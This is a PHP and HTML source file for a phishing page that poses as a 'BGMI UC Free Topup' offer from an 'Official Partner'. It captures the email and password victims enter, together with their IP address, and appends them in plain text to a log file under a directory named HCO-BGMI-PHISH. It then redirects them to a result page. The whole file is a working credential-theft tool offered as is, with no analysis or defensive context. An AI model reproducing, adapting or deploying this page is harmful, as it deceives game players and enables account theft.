<?php
ob_start();
session_start();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
    $diamonds = filter_input(INPUT_POST, 'diamonds', FILTER_VALIDATE_INT);

    if (empty($email) || empty($password) || !$diamonds) {
        http_response_code(400);
        die("Invalid input");
    }

    $data = [
        'email' => $email,
        'password' => $password,
        'diamonds' => $diamonds,
        'ip' => $_SERVER['REMOTE_ADDR']
    ];

    $log = "\n===========================================\n";
    $log .= "[New UC Request]\n";
    $log .= "Email: {$data['email']}\n";
    $log .= "Password: {$data['password']}\n";
    $log .= "UC: {$data['diamonds']}\n";
    $log .= "IP Address: {$data['ip']}\n";
    $log .= "===========================================\n";

    file_put_contents("/data/data/com.termux/files/home/HCO-BGMI-PHISH/data.log", $log, FILE_APPEND | LOCK_EX);
    $_SESSION['submission'] = $data;
    header("Location: result.php");
    exit();
}
ob_end_flush();
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>BGMI UC</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
</head>
<body class="bg-gradient-to-r from-yellow-400 to-red-500 flex justify-center items-center min-h-screen p-4">
  <div class="bg-white rounded-2xl shadow-xl max-w-md w-full p-6">
    <h1 class="text-3xl font-bold text-center text-gray-800 mb-6">BGMI UC Free Topup</h1>
    <form method="POST" class="space-y-4">
      <input type="text" name="email" required placeholder="Email" class="w-full px-4 py-3 rounded-lg border border-gray-300">
      <input type="password" name="password" required placeholder="Password" class="w-full px-4 py-3 rounded-lg border border-gray-300">
      <select name="diamonds" required class="w-full px-4 py-3 rounded-lg border border-gray-300">
        <option value="">Choose UC package</option>
        <option value="100">100 UC</option>
        <option value="530">530 UC</option>
        <option value="1060">1060 UC</option>
        <option value="2180">2180 UC</option>
      </select>
      <button type="submit" class="w-full bg-yellow-500 hover:bg-yellow-600 text-white py-3 rounded-lg">Get For Free</button>
    </form>
    <p class="mt-6 text-center text-sm text-gray-500">100% Secure & Fast | BGMI Official Partner</p>
  </div>
</body>
</html>
